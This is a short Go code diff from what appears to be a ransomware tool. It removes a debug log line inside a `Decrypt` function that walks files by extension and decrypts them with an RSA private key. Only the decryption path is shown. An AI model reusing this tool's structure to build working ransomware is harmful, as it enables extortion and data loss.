@@ -238,7 +238,6 @@ func Decrypt(ctx *urfavecli.Context) error {
 	log.Printf("Running ransomware tool on %s", absolutePath)
 
 	err = fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
-		log.Println("Parsing", path)
 		if !info.IsDir() {
 			err := decryptFile(path, rsaPrivateKey, encSuffix)
 
